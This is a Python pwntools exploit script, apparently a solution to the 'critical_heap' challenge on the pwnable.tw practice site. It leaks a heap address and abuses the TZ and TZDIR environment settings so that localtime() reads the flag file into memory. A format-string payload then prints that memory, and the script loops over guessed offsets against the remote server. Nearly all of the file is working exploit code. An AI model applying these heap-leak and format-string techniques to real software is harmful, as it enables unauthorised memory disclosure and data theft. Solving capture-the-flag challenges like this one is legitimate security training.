# -*- coding: utf-8 -*- 
from pwn import *

##context.log_level='debug'

def Create_normal_heap(name,content):

	s.recvuntil('Your choice : ')
	s.sendline('1')	
	s.recvuntil('Name of heap:')
	s.sendline(name)
	s.recvuntil('Your choice : ')
	s.sendline('1') #Normal
	s.recvuntil('Content of heap :')
	s.send(content)

def Create_clock_heap(name):

        s.recvuntil('Your choice : ')   
        s.sendline('1') 
        s.recvuntil('Name of heap:')
        s.sendline(name)
        s.recvuntil('Your choice : ')
        s.sendline('2') #Clock

def Create_system_heap(name):

        s.recvuntil('Your choice : ')
        s.sendline('1') 
        s.recvuntil('Name of heap:')
        s.sendline(name)
        s.recvuntil('Your choice : ')
        s.sendline('3') #System

def Play_system_set(index,sysheap_name,sysheap_value):

        s.recvuntil('Your choice : ')
        s.sendline('4') #4.play!!
	s.recvuntil('Index of heap :')
	s.sendline(str(index))
	s.recvuntil('Your choice : ')
	s.sendline('1') #1.Set the name for the heap
	s.recvuntil('Give me a name for the system heap :')
	s.sendline(sysheap_name)
	s.recvuntil('Give me a value for this name :')
	s.sendline(sysheap_value)

def Play_system_get_value_of_name(name):
	#Value pointer will be stored 0x604040+0x20 address
	#0x604040+0x18 is stored content of Normal menu
        s.recvuntil('Your choice : ')
	s.sendline('4') #4.Get the value of name
	s.recvuntil("What's name do you want to see :")
	s.sendline(name) 

def Show_heap(index,until=False):
	
        s.recvuntil('Your choice : ')
        s.sendline('2')
        s.recvuntil('Index of heap :')
        s.sendline(str(index))

	if until is not False:
		s.recvuntil(until)

def Delete_heap(index):

        s.recvuntil('Your choice : ')
        s.sendline('5')
        s.recvuntil('Index of heap :')
        s.sendline(str(index))

def Show_content(choice,content):
	s.recvuntil('Your choice :')
	s.sendline(str(choice)) #1.show, 2.change
	
	if choice is 2:
		s.recvuntil('Content :')
		s.send(content)

def Return():
     s.recvuntil('Your choice : ')
     s.sendline('5')

class Program_Exception(Exception):
    pass

if __name__ == '__main__':

	#where = 'local'
	where = 'server'

	offset=0x5e0

	while True:

		try:
			if where is 'local':
				s=process('critical_heap')
				dir_='/home/zj3t/Desktop/tw/critical_heap'
			elif where is 'server':
				s=remote('chall.pwnable.tw',10500)
				dir_='/home/critical_heap++'
	
			file_='flag'
	
			Create_system_heap('A'*0x10) #index 0
			Play_system_set(0,'A'*0x10,'a'*0x20)
			
			Play_system_get_value_of_name('A'*0x10)
			Return()
			#0x604048 => 0 , After, Content pointer can be alloc in 0x604040+0x20 from Normal menu!!
			Delete_heap(0)
			Create_normal_heap('A'*0x10,'B'*0x8) #index 0
		
			Show_heap(0,until='Content : BBBBBBBB')
			heap_leak=u64(s.recv(4).ljust(8,'\x00'))
		
			if where is 'local':	
				heap_base=heap_leak-0x2a1 #local
		
			elif where is 'server':
				heap_base=heap_leak-0x151 #server
			
			Create_system_heap('TZDIR') #index 1
			Play_system_set(1,'TZDIR',dir_)
			Return()

			Create_system_heap('TZ') #index 2
			Play_system_set(2,'TZ',file_)
			Return()		
	
			#index 3
			Create_clock_heap('localtime()') #localtime() use TZ, TZDIR of env variable 	
		
			if where is 'local':
				flag_addr=heap_base+0x8b0
			elif where is 'server':
				flag_addr=heap_base+offset
	
		        s.recvuntil('Your choice : ')
			s.sendline('4') #Normal Play menu
			s.recvuntil('Index of heap :')
		        s.sendline('0')
	
			Show_content(2,'%c'*0xc+'%s'+'AAAAAA'+p64(flag_addr))
			Show_content(1,'!')
		
			buf=s.recvuntil('Normal Heap')
		
			s.recvuntil('Your choice :')
			s.sendline('3') #return 
			s.recvuntil('Your choice :')
			s.sendline('6')
	
			s.recvuntil('Bye')
			print "Flag address : "+str(hex(flag_addr))
			print "Heap leak address : "+str(hex(heap_leak))	
		        print "Heap base address : "+str(hex(heap_base))
		
			offset+=0x10
	
			print buf

		except (Program_Exception,EOFError) as e:
                        print "EOFError"
			s.close()
			continue

